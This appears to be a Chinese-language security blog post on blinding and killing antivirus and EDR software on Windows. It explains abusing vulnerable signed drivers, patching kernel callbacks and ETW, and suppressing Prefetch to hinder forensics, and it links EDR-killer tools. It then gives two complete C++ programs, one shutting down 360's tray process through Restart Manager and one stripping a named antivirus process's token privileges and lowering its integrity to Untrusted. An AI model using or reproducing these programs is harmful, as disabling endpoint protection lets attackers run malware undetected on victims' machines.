---
layout: post
title: kill杀软
categories: bypass
description: bypass 之 kill杀软
keywords: Windows，kill杀软，免杀，bypass
---

EDR系统致盲技术，kill杀软

# EDR致盲技术

## BYOVD技术

BYOVD —— 利用带有漏洞的合法签名白驱动直接结束安全软件进程

### 一、BYOVD利用技术

BYOVD是将存在漏洞的合法驱动投递至目标系统，借助其完成恶意操作的攻击技术。借助滥用的合法驱动签名，攻击者得以绕过DSE（强制驱动签名）机制的限制，在Ring0空间完成各种攻击操作。

典型BYOVD利用过程

| 驱动文件       | 利用类型     | 厂商                 |
| -------------- | ------------ | -------------------- |
| DBUtil_2_3.sys | 虚拟内存读写 | DELL(CVE-2021-21551) |
| ene.sys        | 物理内存读写 | ENE Technology       |

攻击者在两次攻击活动中滥用了不同的驱动文件来作为敲门砖，但是漏洞利用效果与利用链构造上如出一辙：利用内存写入类漏洞篡改内核线程对象的PreviousMode属性，达到从用户态访问内核空间的攻击效果。

### 二、PreviousMode篡改

```
typedef enum _MODE {
KernelMode = 0,
UserMode = 1,
} MODE;
```

ETHREAD内核数据结构中的PreviousMode原本用于指示函数的调用方，当系统调用来自用户态线程中时，系统调用的处理函数会在线程对象中设置其PreviousMode属性为1（UserMode），若调用方为内核或系统进程则将其置于0（KernelMode）。该值标识了调用源是否来自可信的环境。

若该值被置为0，类似于NtWriteVirtualMemory这样的函数可同时读写用户态与内核态的内存空间”。利用这样的方式，可以对内核数据结构执行了一系列篡改，以达成防御削弱的战术目的。

### 三、Ring0级防御削弱技术

利用BYOVD利用技术突破到Ring0级权限，并获取内核空间的读写权限后采取了一系列防御削弱的攻击手段，禁用了一系列内核回调函数以及检测基础设施，达到致盲安全产品的目的。

按照一定顺序对于一些系统回调函数进行了Patch，实现破坏针对进程、线程、模块和注册表等检测能力。为了保证保证不会有通知发往现存的回调函数，攻击者首先对PspNotifyEnableMask结构加以patch。

| 内核数据结构                     | 说明                         |
| -------------------------------- | ---------------------------- |
| nt!PspNotifyEnableMask           | 表征回调函数是否安装         |
| nt!PspLoadImageNotifyRoutine     | 禁用模块加载（驱动加载）检测 |
| nt!PspCreateThreadNotifyRoutine  | 禁用线程创建/终止检测        |
| nt!PspCreateProcessNotifyRoutine | 禁用进程创建/终止检测        |
| nt!CallbackListHead              | 禁用注册表修改检测           |
| nt!ObTypeIndexTable              | 禁用Object Callback          |

除此之外攻击者禁用了白名单之外的Mini File Filter与WFP驱动程序，破坏安全产品对于文件系统和网络流量的检测能力。ETW是Windows操作系统提供的安全事件日志采集的基础设施，帮助EDR等安全产品捕获恶意行为，攻击者通过对于ETW相关的一系列句柄与参数的覆写破坏了ETW的可用性。

篡改的ETW相关数据结构

- nt!EtwpEventTracingProvRegHandle

- nt!EtwKernelProvRegHandle

- nt!EtwpPsProvRegHandle

- nt!EtwpNetProvRegHandle

- nt!EtwpDiskProvRegHandle

- nt!EtwpFileProvRegHandle

- nt!EtwSecurityMitigationsRegHandle

- nt!EtwpHostSiloState

### 四、反取证-禁用Windows Prefetch文件创建

Windows Prefetch（预读取）文件被设计以加速程序的打开速度，其中存储了近期执行程序的记录。进程路径、文件创建/修改/执行时间等信息，也为恶意程序执行的分析取证提供了机会。

攻击者通过内核中nt!PfSnNumActiveTraces数据结构的篡改，禁用了Windows Prefetch文件的创建，达到反取证的目的。当该数据结构的值被篡改后，生成Prefetch文件的关键函数PfSnBeginTrace将永远返回-1，达到破坏生成的目的。

## 移除回调

win64 HOOK SSDT  kpp patchguard  回调

https://github.com/br-sn/CheekyBlinder

https://github.com/RedCursorSecurityConsulting/PPLKiller

https://github.com/uf0o/windows-ps-callbacks-experiments/tree/master/edr-driver

https://github.com/lawiet47/STFUEDR

## 阻止流量出站

https://www.wangan.com/p/11v8239694f8fe03

## R3 terminate

### RmShutdow机制的滥用

https://learn.microsoft.com/en-us/windows/win32/rstmgr/restart-manager-portal

https://www.crowdstrike.com/blog/windows-restart-manager-part-1/

### kill360

```c++
#include <windows.h>
#include <RestartManager.h>
#include <stdio.h>
#pragma comment(lib,"Rstrtmgr.lib")
/*
1.开始一个新的会话，使用 RmStartSession 函数。这将返回一个会话句柄和一个会话密钥。
2.将要管理的文件或进程注册为资源，使用 RmRegisterResources 函数。
3.使用 RmGetList 函数来检索所有与已注册的资源相关的进程信息。这将返回一个包含 RM_PROCESS_INFO 结构的数组，其中包含有关这些进程的详细信息，例如进程 ID 和进程名称。
4.使用 RmShutdown 函数来关闭所有与已注册的资源相关的进程。这将使这些进程在关闭时执行一个安全的关闭过程，以确保数据的一致性和完整性。
5.最后，使用 RmEndSession 函数来结束会话
*/
int __cdecl wmain(int argc, WCHAR** argv)
{
  DWORD dwSessionHandle = 0xFFFFFFFF;
  WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
  DWORD dwError = RmStartSession(&dwSessionHandle, 0, szSessionKey);
  wprintf(L"RmStartSession returned %d\n", dwError);
  if (dwError == ERROR_SUCCESS)
  {
      // PCWSTR pszFile = argv[1];
      PCWSTR pszFile = L"D:\\360\\360Safe\\safemon\\360tray.exe";
      dwError = RmRegisterResources(dwSessionHandle, 1, &pszFile, 0, NULL, 0, NULL);
      if (dwError == ERROR_SUCCESS)
      {
          DWORD dwReason;
          UINT i;
          UINT nProcInfoNeeded;
          UINT nProcInfo = 100;
          RM_PROCESS_INFO rgpi[100];
          dwError = RmGetList(dwSessionHandle, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);

          if (dwError == ERROR_SUCCESS)
          {
              RmShutdown(dwSessionHandle, 0, NULL);
          }
      }
      RmEndSession(dwSessionHandle);
  }
  return 0;
}
```

## 降低令牌完整性

### EnableDebugPrivilege

```c++
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>
#include <conio.h>

bool EnableDebugPrivilege()
{
  HANDLE hToken;
  LUID sedebugnameValue;
  TOKEN_PRIVILEGES tkp;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
  {
      return   FALSE;
  }
  if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
  {
      CloseHandle(hToken);
      return false;
  }
  tkp.PrivilegeCount = 1;
  tkp.Privileges[0].Luid = sedebugnameValue;
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
  {
      CloseHandle(hToken);
      return false;
  }
  return true;
}

int getpid(LPCWSTR procname) {

  DWORD procPID = 0;
  LPCWSTR processName = L"";
  PROCESSENTRY32 processEntry = {};
  processEntry.dwSize = sizeof(PROCESSENTRY32);


  // replace this with Ntquerysystemapi
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
  if (Process32First(snapshot, &processEntry))
  {
      while (_wcsicmp(processName, procname) != 0)
      {
          Process32Next(snapshot, &processEntry);
          processName = processEntry.szExeFile;
          procPID = processEntry.th32ProcessID;
      }
      printf("[+] Got target proc PID: %d\n", procPID);
  }

  return procPID;
}

BOOL SetPrivilege(
  HANDLE hToken,         // access token handle
  LPCTSTR lpszPrivilege, // name of privilege to enable/disable
  BOOL bEnablePrivilege   // to enable or disable privilege
)
{
  TOKEN_PRIVILEGES tp;
  LUID luid;

  if (!LookupPrivilegeValue(
      NULL,           // lookup privilege on local system
      lpszPrivilege,   // privilege to lookup
      &luid))       // receives LUID of privilege
  {
      printf("LookupPrivilegeValue error: %u\n", GetLastError());
      return FALSE;
  }

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  if (bEnablePrivilege)
      tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
  else
      tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

  // Enable the privilege or disable all privileges.

  if (!AdjustTokenPrivileges(
      hToken,
      FALSE,
      &tp,
      sizeof(TOKEN_PRIVILEGES),
      (PTOKEN_PRIVILEGES)NULL,
      (PDWORD)NULL))
  {
      printf("AdjustTokenPrivileges error: %u\n", GetLastError());
      return FALSE;
  }

  if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

  {
      printf("The token does not have the specified privilege. \n");
      return FALSE;
  }

  return TRUE;
}


int main(int argc, char** argv)
{
  LUID sedebugnameValue;
  EnableDebugPrivilege();

  wchar_t procname[80];
  size_t convertedChars = 0;
  mbstowcs_s(&convertedChars, procname, 80, argv[1], _TRUNCATE);

  int pid = getpid(procname);


  // printf("PID %d\n", pid);
  printf("[*] Killing AV...\n");

  // hardcoding PID of msmpeng for now
  HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

  if (phandle != INVALID_HANDLE_VALUE) {

      printf("[*] Opened Target Handle\n");
  }
  else {
      printf("[-] Failed to open Process Handle\n");
  }

  // printf("%p\n", phandle);

  HANDLE ptoken;

  BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);

  if (token) {
      printf("[*] Opened Target Token Handle\n");
  }
  else {
      printf("[-] Failed to open Token Handle\n");
  }

  LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);


  TOKEN_PRIVILEGES tkp;

  tkp.PrivilegeCount = 1;
  tkp.Privileges[0].Luid = sedebugnameValue;
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {

      printf("[-] Failed to Adjust Token's Privileges\n");
      return 0;
  }


  // Remove all privileges
  SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
  SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
  SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
  SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
  SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
  SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
  SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
  SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
  SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
  SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
  SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
  SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
  SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
  SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

  printf("[*] Removed All Privileges\n");


  DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;


  SID integrityLevelSid{};
  integrityLevelSid.Revision = SID_REVISION;
  integrityLevelSid.SubAuthorityCount = 1;
  integrityLevelSid.IdentifierAuthority.Value[5] = 16;
  integrityLevelSid.SubAuthority[0] = integrityLevel;

  TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
  tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
  tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

  if (!SetTokenInformation(
      ptoken,
      TokenIntegrityLevel,
      &tokenIntegrityLevel,
      sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
  {
      printf("SetTokenInformation failed\n");
  }
  else {

      printf("[*] Token Integrity set to Untrusted\n");
  }

  CloseHandle(ptoken);
  CloseHandle(phandle);

}
```

